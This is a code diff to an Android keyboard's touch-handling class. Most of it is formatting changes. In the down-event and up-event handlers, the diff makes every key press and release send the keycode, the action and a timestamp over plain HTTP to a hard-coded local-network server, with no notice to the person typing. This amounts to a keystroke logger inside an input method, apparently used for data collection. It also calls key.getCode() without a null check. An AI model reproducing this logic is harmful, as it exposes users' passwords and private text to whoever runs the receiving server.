@@ -21,7 +21,11 @@ import android.content.res.TypedArray;
 import android.util.Log;
 import android.view.MotionEvent;
 
+import java.text.ParseException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.Date;
 
 import com.abifog.lokiboard.R;
 import com.abifog.lokiboard.keyboard.internal.BogusMoveEventDetector;
@@ -68,7 +72,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
 
     // Parameters for pointer handling.
     private static PointerTrackerParams sParams;
-    private static int sPointerStep = (int)(10.0 * Resources.getSystem().getDisplayMetrics().density);
+    private static int sPointerStep = (int) (10.0 * Resources.getSystem().getDisplayMetrics().density);
 
     private static final ArrayList<PointerTracker> sTrackers = new ArrayList<>();
     private static final PointerTrackerQueue sPointerTrackerQueue = new PointerTrackerQueue();
@@ -125,7 +129,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
 
     // TODO: Add PointerTrackerFactory singleton and move some class static methods into it.
     public static void init(final TypedArray mainKeyboardViewAttr, final TimerProxy timerProxy,
-            final DrawingProxy drawingProxy) {
+                            final DrawingProxy drawingProxy) {
         sParams = new PointerTrackerParams(mainKeyboardViewAttr);
 
         final Resources res = mainKeyboardViewAttr.getResources();
@@ -193,7 +197,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
 
     // Returns true if keyboard has been changed by this callback.
     private boolean callListenerOnPressAndCheckKeyboardLayoutChange(final Key key,
-            final int repeatCount) {
+                                                                    final int repeatCount) {
         // While gesture input is going on, this method should be a no-operation. But when gesture
         // input has been canceled, <code>sInGesture</code> and <code>mIsDetectingGesture</code>
         // are set to false. To keep this method is a no-operation,
@@ -222,7 +226,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
     // Note that we need primaryCode argument because the keyboard may in shifted state and the
     // primaryCode is different from {@link Key#mKeyCode}.
     private void callListenerOnCodeInput(final Key key, final int primaryCode, final int x,
-            final int y, final boolean isKeyRepeat) {
+                                         final int y, final boolean isKeyRepeat) {
         final boolean ignoreModifierKey = mIsInDraggingFinger && key.isModifier();
         final boolean altersCode = key.altCodeWhileTyping() && sTimerProxy.isTypingState();
         final int code = altersCode ? key.getAltCode() : primaryCode;
@@ -242,7 +246,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
                 sListener.onTextInput(key.getOutputText());
             } else if (code != Constants.CODE_UNSPECIFIED) {
                 sListener.onCodeInput(code,
-                    Constants.NOT_A_COORDINATE, Constants.NOT_A_COORDINATE, isKeyRepeat);
+                        Constants.NOT_A_COORDINATE, Constants.NOT_A_COORDINATE, isKeyRepeat);
             }
         }
     }
@@ -250,14 +254,14 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
     // Note that we need primaryCode argument because the keyboard may be in shifted state and the
     // primaryCode is different from {@link Key#mKeyCode}.
     private void callListenerOnRelease(final Key key, final int primaryCode,
-            final boolean withSliding) {
+                                       final boolean withSliding) {
         // See the comment at {@link #callListenerOnPressAndCheckKeyboardLayoutChange(Key}}.
         final boolean ignoreModifierKey = mIsInDraggingFinger && key.isModifier();
         if (DEBUG_LISTENER) {
             Log.d(TAG, String.format("[%d] onRelease  : %s%s%s%s", mPointerId,
                     Constants.printableCode(primaryCode),
                     withSliding ? " sliding" : "", ignoreModifierKey ? " ignoreModifier" : "",
-                    key.isEnabled() ?  "": " disabled"));
+                    key.isEnabled() ? "" : " disabled"));
         }
         if (ignoreModifierKey) {
             return;
@@ -388,7 +392,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
     }
 
     private static int getDistance(final int x1, final int y1, final int x2, final int y2) {
-        return (int)Math.hypot(x1 - x2, y1 - y2);
+        return (int) Math.hypot(x1 - x2, y1 - y2);
     }
 
     private Key onMoveKeyInternal(final int x, final int y) {
@@ -409,7 +413,8 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
         return newKey;
     }
 
-    /* package */ static int getActivePointerTrackerCount() {
+    /* package */
+    static int getActivePointerTrackerCount() {
         return sPointerTrackerQueue.size();
     }
 
@@ -427,33 +432,33 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
                 if (shouldIgnoreOtherPointers && id != mPointerId) {
                     continue;
                 }
-                final int x = (int)me.getX(index);
-                final int y = (int)me.getY(index);
+                final int x = (int) me.getX(index);
+                final int y = (int) me.getY(index);
                 final PointerTracker tracker = getPointerTracker(id);
                 tracker.onMoveEvent(x, y, eventTime);
             }
             return;
         }
         final int index = me.getActionIndex();
-        final int x = (int)me.getX(index);
-        final int y = (int)me.getY(index);
+        final int x = (int) me.getX(index);
+        final int y = (int) me.getY(index);
         switch (action) {
-        case MotionEvent.ACTION_DOWN:
-        case MotionEvent.ACTION_POINTER_DOWN:
-            onDownEvent(x, y, eventTime, keyDetector);
-            break;
-        case MotionEvent.ACTION_UP:
-        case MotionEvent.ACTION_POINTER_UP:
-            onUpEvent(x, y, eventTime);
-            break;
-        case MotionEvent.ACTION_CANCEL:
-            onCancelEvent(x, y, eventTime);
-            break;
+            case MotionEvent.ACTION_DOWN:
+            case MotionEvent.ACTION_POINTER_DOWN:
+                onDownEvent(x, y, eventTime, keyDetector);
+                break;
+            case MotionEvent.ACTION_UP:
+            case MotionEvent.ACTION_POINTER_UP:
+                onUpEvent(x, y, eventTime);
+                break;
+            case MotionEvent.ACTION_CANCEL:
+                onCancelEvent(x, y, eventTime);
+                break;
         }
     }
 
     private void onDownEvent(final int x, final int y, final long eventTime,
-            final KeyDetector keyDetector) {
+                             final KeyDetector keyDetector) {
         setKeyDetectorInner(keyDetector);
         if (DEBUG_EVENT) {
             printTouchEvent("onDownEvent:", x, y, eventTime);
@@ -465,7 +470,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
             if (distance < sParams.mTouchNoiseThresholdDistance) {
                 if (DEBUG_MODE)
                     Log.w(TAG, String.format("[%d] onDownEvent:"
-                            + " ignore potential noise: time=%d distance=%d",
+                                    + " ignore potential noise: time=%d distance=%d",
                             mPointerId, deltaT, distance));
                 cancelTrackingForAction();
                 return;
@@ -473,16 +478,32 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
         }
 
         final Key key = getKeyOn(x, y);
-        RequestPackage requestPackage = new RequestPackage();
-        requestPackage.setMethod("GET");
-        requestPackage.setUrl("http://192.168.43.201:8000");
-        requestPackage.setParam("keycode", String.valueOf(key.getCode()));
-        requestPackage.setParam("keyaction", "press");
 
-        Downloader downloader = new Downloader(); //Instantiation of the Async task
-        //that’s defined below
+        Date today = Calendar.getInstance().getTime();
 
-        downloader.execute(requestPackage);
+        // Constructs a SimpleDateFormat using the given pattern
+        SimpleDateFormat crunchifyFormat = new SimpleDateFormat("MMM dd yyyy HH:mm:ss.SSS zzz");
+
+        // format() formats a Date into a date/time string.
+        String currentTime = crunchifyFormat.format(today);
+        try {
+            Date date = crunchifyFormat.parse(currentTime);
+            long epochTime = date.getTime();
+
+            RequestPackage requestPackage = new RequestPackage();
+            requestPackage.setMethod("GET");
+            requestPackage.setUrl("http://192.168.1.16:8000");
+            requestPackage.setParam("keycode", String.valueOf(key.getCode()));
+            requestPackage.setParam("keyaction", "press");
+            requestPackage.setParam("timestamp", String.valueOf(epochTime));
+
+            Downloader downloader = new Downloader(); //Instantiation of the Async task
+            //that’s defined below
+
+            downloader.execute(requestPackage);
+        } catch (ParseException e) {
+            e.printStackTrace();
+        }
 
         mBogusMoveEventDetector.onActualDownEvent(x, y);
         if (key != null && key.isModifier()) {
@@ -588,7 +609,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
     }
 
     private void dragFingerFromOldKeyToNewKey(final Key key, final int x, final int y,
-            final long eventTime, final Key oldKey) {
+                                              final long eventTime, final Key oldKey) {
         // The pointer has been slid in to the new key from the previous key, we must call
         // onRelease() first to notify that the previous key has been released, then call
         // onPress() to notify that the new key is being pressed.
@@ -686,16 +707,31 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
 
         final Key key = getKeyOn(this.mKeyX, this.mKeyY);
 
-        RequestPackage requestPackage = new RequestPackage();
-        requestPackage.setMethod("GET");
-        requestPackage.setUrl("http://192.168.43.201:8000");
-        requestPackage.setParam("keycode", String.valueOf(key.getCode()));
-        requestPackage.setParam("keyaction", "release");
+        Date today = Calendar.getInstance().getTime();
 
-        Downloader downloader = new Downloader(); //Instantiation of the Async task
-        //that’s defined below
+        // Constructs a SimpleDateFormat using the given pattern
+        SimpleDateFormat crunchifyFormat = new SimpleDateFormat("MMM dd yyyy HH:mm:ss.SSS zzz");
 
-        downloader.execute(requestPackage);
+        // format() formats a Date into a date/time string.
+        String currentTime = crunchifyFormat.format(today);
+        try {
+            Date date = crunchifyFormat.parse(currentTime);
+            long epochTime = date.getTime();
+
+            RequestPackage requestPackage = new RequestPackage();
+            requestPackage.setMethod("GET");
+            requestPackage.setUrl("http://192.168.1.16:8000");
+            requestPackage.setParam("keycode", String.valueOf(key.getCode()));
+            requestPackage.setParam("keyaction", "release");
+            requestPackage.setParam("timestamp", String.valueOf(epochTime));
+
+            Downloader downloader = new Downloader(); //Instantiation of the Async task
+            //that’s defined below
+
+            downloader.execute(requestPackage);
+        } catch (ParseException e) {
+            e.printStackTrace();
+        }
 
         onUpEventInternal(x, y);
         sPointerTrackerQueue.remove(this);
@@ -725,7 +761,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
         // Release the last pressed key.
         setReleasedKeyGraphics(currentKey, true /* withAnimation */);
 
-        if(mCursorMoved && currentKey.getCode() == Constants.CODE_DELETE) {
+        if (mCursorMoved && currentKey.getCode() == Constants.CODE_DELETE) {
             sListener.onUpWithDeletePointerActive();
         }
 
@@ -844,21 +880,21 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
         final int distanceFromKeyEdgeSquared = curKey.squaredDistanceToEdge(x, y);
         if (distanceFromKeyEdgeSquared >= keyHysteresisDistanceSquared) {
             if (DEBUG_MODE) {
-                final float distanceToEdgeRatio = (float)Math.sqrt(distanceFromKeyEdgeSquared)
+                final float distanceToEdgeRatio = (float) Math.sqrt(distanceFromKeyEdgeSquared)
                         / mKeyboard.mMostCommonKeyWidth;
                 Log.d(TAG, String.format("[%d] isMajorEnoughMoveToBeOnNewKey:"
-                        +" %.2f key width from key edge", mPointerId, distanceToEdgeRatio));
+                        + " %.2f key width from key edge", mPointerId, distanceToEdgeRatio));
             }
             return true;
         }
         if (!mIsAllowedDraggingFinger && mBogusMoveEventDetector.hasTraveledLongDistance(x, y)) {
             if (DEBUG_MODE) {
-                final float keyDiagonal = (float)Math.hypot(
+                final float keyDiagonal = (float) Math.hypot(
                         mKeyboard.mMostCommonKeyWidth, mKeyboard.mMostCommonKeyHeight);
                 final float lengthFromDownRatio =
                         mBogusMoveEventDetector.getAccumulatedDistanceFromDownKey() / keyDiagonal;
                 Log.d(TAG, String.format("[%d] isMajorEnoughMoveToBeOnNewKey:"
-                        + " %.2f key diagonal from virtual down point",
+                                + " %.2f key diagonal from virtual down point",
                         mPointerId, lengthFromDownRatio));
             }
             return true;
@@ -937,7 +973,7 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
     }
 
     private void printTouchEvent(final String title, final int x, final int y,
-            final long eventTime) {
+                                 final long eventTime) {
         final Key key = mKeyDetector.detectHitKey(x, y);
         final String code = (key == null ? "none" : Constants.printableCode(key.getCode()));
         Log.d(TAG, String.format("[%d]%s%s %4d %4d %5d %s", mPointerId,
